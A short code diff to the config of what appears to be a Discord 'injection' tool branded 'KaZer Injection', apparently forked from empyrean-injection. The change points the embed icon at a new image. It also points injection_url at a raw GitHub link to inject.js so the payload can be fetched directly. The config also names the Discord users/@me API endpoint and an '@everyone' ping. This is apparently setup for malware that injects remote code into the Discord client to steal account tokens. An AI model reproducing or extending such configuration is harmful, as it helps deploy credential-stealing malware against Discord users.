@@ -12,9 +12,9 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone', 
   embed_name: 'KaZer Injection', 
-  embed_icon: 'https://github.com/addi00000/empyrean-injection/blob/main/imgs/pfp.png', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1034609122336837642/1040801977501753465/jujutsu-kaisen-satoru-gojo-fond-d-ecran-2048x1152_49.jpg', 
   embed_color: 0, 
-  injection_url: 'https://github.com/KaZerCfx/INject/edit/main/inject.js', 
+  injection_url: 'https://raw.githubusercontent.com/KaZerCfx/INject/main/inject.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
